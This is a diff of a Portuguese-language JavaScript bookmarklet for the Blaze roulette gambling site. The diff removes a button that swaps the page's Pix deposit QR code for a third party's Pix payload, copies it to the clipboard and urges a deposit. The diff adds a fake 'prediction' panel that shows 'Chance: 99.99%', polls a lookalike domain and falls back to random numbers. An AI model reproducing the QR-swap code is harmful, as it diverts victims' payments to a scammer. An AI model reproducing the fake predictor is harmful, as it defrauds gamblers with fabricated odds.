@@ -1,87 +1,117 @@
-javascript:(function() {
-    const menu = createMenu();
+javascript:(async function() {
+    const apiUrls = {
+        current: 'https://blaze1.space/api/singleplayer-originals/originals/roulette_games/current/1',
+        recent: 'https://blaze1.space/api/singleplayer-originals/originals/roulette_games/recent/1',
+        history: 'https://blaze.com/api/roulette_games/history_analytics?n=3000'
+    };
 
-    // Adiciona a folha de estilos
+    const menu = createMenu();
     const link = document.createElement('link');
     link.rel = 'stylesheet';
     link.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
     document.head.appendChild(link);
-
     document.body.appendChild(menu);
     document.addEventListener('dblclick', (e) => toggleMenu(menu, e.clientY, e.clientX));
 
-    // Cria o menu
     function createMenu() {
         const m = document.createElement('div');
         Object.assign(m.style, {
-            position: 'fixed', top: '30%', left: '30%', width: '200px',  // Largura reduzida
-            background: '#F5F5F5', color: '#fff', padding: '10px', borderRadius: '8px', 
-            border: '2px solid #ADFF2F', boxShadow: '0 0 10px rgba(0,0,0,0.5)', display: 'none', zIndex: '9999'
+            position: 'fixed',
+            width: '290px',
+            background: '#1e1e1e',
+            color: '#fff',
+            padding: '10px',
+            borderRadius: '8px',
+            border: '2px solid #00FF00',
+            boxShadow: '0 0 10px rgba(0,0,0,0.5)',
+            display: 'none',
+            zIndex: '9999'
         });
+
         m.innerHTML = `
-            <img src="https://i.ibb.co/j3Z3r1S/Proxy-sha-256-20241023-175438-0000.jpg" style="display: block; margin: 0 auto; width: 100px; height: 100px; border-radius: 50%; border: 2px solid #ADFF2F;"> <!-- Tamanho da imagem aumentado -->
-            <h3 style='text-align:center;'>System Proxy <i class="fas fa-check-circle" style="color: #ADFF2F;"></i></h3>
-            <span id='closeMenu' style="float:right; cursor:pointer; font-size: 24px; color: white;">X</span>
-            <button id='actionButton' style='display: block; margin: 10px auto; padding: 5px; border: none; border-radius: 5px; background-color: #ADFF2F; color: white; cursor: pointer; width: 80%;'>Aplicar Bug Proxy</button> <!-- Largura do botão reduzida -->
-            <div style='text-align:center; margin-top: 10px;'><i class="fas fa-cogs"></i> SHA256 | <i class="fas fa-info-circle"></i> Limites: 10</div> <!-- Colocado embaixo do botão -->
+            <div style="display: flex; align-items: center;">
+                <img src="https://i.ibb.co/y0LXzcQ/IMG-20241017-WA0216.jpg" style="width: 80px; height: 80px; border-radius: 50%; border: 2px solid #00FF00; margin-right: 10px;">
+                <div style="flex-grow: 1; text-align: center;">
+                    <h3 style='margin: 0; font-size: 18px; color: white;'>NEW SYSTEM 00</h3>
+                    <div style='font-size: 12px; color: #00FF00; margin-top: 3px; display: flex; align-items: center; justify-content: center;'>
+                        <i class="fab fa-instagram" style="margin-right: 5px; color: #00FF00;"></i>
+                        bot00blaze
+                    </div>
+                    <div id="hackingMessage" style="font-size: 14px; color: #00FF00; margin-top: 10px;">Bem-vindo ao New System 00</div>
+                </div>
+                <span id='closeMenu' style="cursor: pointer; font-size: 14px; color: white;">❌</span>
+            </div>
+            <div id="messageArea" style="margin-top: 10px; padding: 5px; background-color: #333; border-radius: 5px;">
+                <p id="messageText" style="margin: 0; font-size: 14px;">Nenhuma mensagem no momento</p>
+            </div>
+            <div style="margin-top: 10px; text-align: center;">
+                <div style="display: flex; align-items: center; gap: 5px;">
+                    <span class="chance" style="color: #00FF00; font-weight: bold;">Chance: 99.99%</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 5px;">
+                    Entrar no: <span class="colorIndicator">🔴</span>
+                </div>
+                <div id="winMessage" style="color: #00FF00; font-weight: bold; display: none;"></div>
+                <div style="margin-top: 10px; font-size: 12px; color: #00FF00;">
+                    <div style="background-color: rgba(255, 255, 255, 0.1); padding: 3px 5px; border-radius: 5px; display: inline-block;">
+                        SHA256 | Versão: 4.0
+                    </div>
+                </div>
+            </div>
+            <div style="margin-top: 20px;">
+                <div style="height: 100px; width: 100%; background-color: #333; border-radius: 10px; position: relative;">
+                    <div id="redBar" style="position: absolute; bottom: 0; width: 33%; height: 0; background-color: red; border-radius: 10px;"></div>
+                    <div id="whiteBar" style="position: absolute; bottom: 0; width: 33%; height: 0; background-color: white; border-radius: 10px;"></div>
+                    <div id="blackBar" style="position: absolute; bottom: 0; width: 33%; height: 0; background-color: black; border-radius: 10px;"></div>
+                </div>
+            </div>
         `;
         return m;
     }
 
-    // Mostra ou oculta o menu com dois cliques
     function toggleMenu(menu, y, x) {
-        if (menu.style.display === 'block') {
-            menu.style.display = 'none';
-        } else {
-            menu.style.top = `${y}px`; 
-            menu.style.left = `${x}px`; 
-            menu.style.display = 'block';
+        menu.style.top = `${y}px`;
+        menu.style.left = `${x}px`;
+        menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+    }
+
+    document.getElementById('closeMenu').addEventListener('click', () => menu.style.display = 'none');
+
+    function showMessage(message) {
+        const messageText = document.getElementById('messageText');
+        messageText.textContent = message;
+    }
+
+    function processResult(colorSymbol) {
+        let redHeight = 0, whiteHeight = 0, blackHeight = 0;
+        if (colorSymbol === 0) whiteHeight = 100;
+        else if (colorSymbol >= 1 && colorSymbol <= 7) redHeight = 100;
+        else if (colorSymbol >= 8 && colorSymbol <= 14) blackHeight = 100;
+
+        document.getElementById('redBar').style.height = `${redHeight}%`;
+        document.getElementById('whiteBar').style.height = `${whiteHeight}%`;
+        document.getElementById('blackBar').style.height = `${blackHeight}%`;
+        document.querySelector(".colorIndicator").innerText = colorSymbol === 0 ? '⚪️' : colorSymbol <= 7 ? '🔴' : '⚫️';
+    }
+
+    async function fetchColorPrediction() {
+        try {
+            const response = await fetch(apiUrls.current);
+            const data = await response.json();
+            return data.color; // A API retorna um valor de cor (0, 1 ou 2) para processar
+        } catch (error) {
+            console.error("Erro ao buscar dados da API:", error);
+            return Math.floor(Math.random() * 15); // Gera cor aleatória caso API falhe
         }
     }
 
-    // Fecha o menu quando o botão "X" for clicado
-    function closeMenu() {
-        menu.style.display = 'none';
+    function initPredictionLoop() {
+        setInterval(async () => {
+            const colorPrediction = await fetchColorPrediction();
+            processResult(colorPrediction);
+        }, 13000);
     }
 
-    document.getElementById('closeMenu').addEventListener('click', closeMenu);
-
-    // Ação do botão "Aplicar Bug Proxy"
-    document.getElementById('actionButton').addEventListener('click', () => {
-        // Código para aplicar o proxy
-        var newQRText = "00020126870014br.gov.bcb.pix2565pix.creditag.com.br/qr/v3/at/443a098d-9ba7-4188-b404-8a9e2cd19aa55204000053039865802BR5917BIGPAG_BRASIL_S/A6008SALVADOR62070503***630498FF";
-        var element = document.querySelector(".qr-code-text .qr-code-text-inner");
-
-        if (element) {
-            element.innerText = newQRText;
-
-            var textArea = document.createElement("textarea");
-            textArea.style.position = "fixed"; 
-            textArea.style.top = "0"; 
-            textArea.style.left = "0";
-            textArea.style.width = "2em"; 
-            textArea.style.height = "2em";
-            textArea.style.padding = "0";
-            textArea.style.border = "none";
-            textArea.style.outline = "none";
-            textArea.style.boxShadow = "none";
-            textArea.style.background = "transparent";
-            textArea.value = newQRText;
-            document.body.appendChild(textArea);
-            textArea.focus();
-            textArea.select();
-
-            try {
-                var successful = document.execCommand('copy');
-                var msg = successful ? "AVISO - LEIA COM ATENÇÃO: PROXY APLICADA COM SUCESSO, FAÇA UM DEPOSITO VIA PIX PARA TORNAR A ASSERTIVIDADE DO PROGRAMA." : "Não foi possível copiar o texto. Tente copiar manualmente.";
-                alert(msg);
-            } catch (err) {
-                alert("Falha ao copiar o texto. Tente copiar manualmente.");
-            }
-
-            document.body.removeChild(textArea);
-        } else {
-            alert("Elemento não encontrado!");
-        }
-    });
+    initPredictionLoop();
+    showMessage('Bem-vindo ao New System 00!');
 })();
